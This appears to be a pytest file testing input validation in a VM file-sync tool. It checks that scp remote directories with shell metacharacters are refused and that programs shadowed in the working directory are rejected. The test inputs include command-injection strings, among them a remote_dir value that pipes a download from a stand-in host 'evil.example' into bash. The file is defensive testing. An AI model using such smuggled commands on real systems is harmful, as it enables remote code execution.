def test_valid_remote_dir_accepts_a_plain_path_and_the_home_spellings():
    for good in ("", "~", ".", "/opt/scraper", "scraper", "~/inployed",
                 "/opt/my-scraper_1.0/"):
        assert vm_sync.valid_remote_dir(good), good


def test_valid_remote_dir_refuses_shell_metacharacters():
    """An scp REMOTE path is transported as `scp -t <path>` through the VM's
    login shell (both OpenSSH scp and the pscp.exe gcloud drives on Windows), so
    it is a shell word there, not an opaque argument."""
    for bad in ("x;id", "x`id`", "x$(id)", "x|id", "x&id", "a b", "x>out",
                "x'y", 'x"y', "x" + chr(10) + "y", "x*", "$HOME"):
        assert not vm_sync.valid_remote_dir(bad), bad


def test_every_scp_flow_refuses_a_hostile_remote_dir():
    """The guard sits in build_scp_cmd, the one place all four scp flows go
    through -- the credential install had its own check (_require_home_remote_dir)
    and the other four pushes had none, on the strength of a docstring claiming
    remote_dir stays in argv where it is data."""
    t = vm_sync.VMTarget(gcloud="gcloud", instance="vm", zone="z", project="p",
                         user="u", remote_dir="x;curl evil.example|bash;#")
    for call in (lambda: t.build_scp_cmd("local.txt", "remote.txt"),
                 lambda: t.push_exclude_ids_cmd("local.txt")):
        with pytest.raises(ValueError) as exc:
            call()
        assert "VM_REMOTE_DIR" in str(exc.value)


def test_a_plain_remote_dir_still_builds_the_same_argv():
    t = vm_sync.VMTarget(gcloud="gcloud", instance="vm", zone="z", project="",
                         user="u", remote_dir="/opt/scraper")
    assert "u@vm:/opt/scraper/b.txt" in t.build_scp_cmd("a.txt", "b.txt")


# --- the cwd-shadow rule covers BOTH lookups on the launch path ---------------

def test_reject_cwd_shadow_refuses_a_program_in_the_working_directory(tmp_path,
                                                                     monkeypatch):
    monkeypatch.chdir(tmp_path)
    shadow = tmp_path / "python.exe"
    shadow.write_text("", encoding="utf-8")
    with pytest.raises(RuntimeError) as exc:
        vm_sync._reject_cwd_shadow("python", str(shadow))
    assert "working directory" in str(exc.value)


def test_reject_cwd_shadow_passes_a_program_from_elsewhere(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    elsewhere = tmp_path / "sub"
    elsewhere.mkdir()
    real = elsewhere / "python.exe"
    real.write_text("", encoding="utf-8")
    assert vm_sync._reject_cwd_shadow("python", str(real)) == str(real)
    assert vm_sync._reject_cwd_shadow("python", None) is None
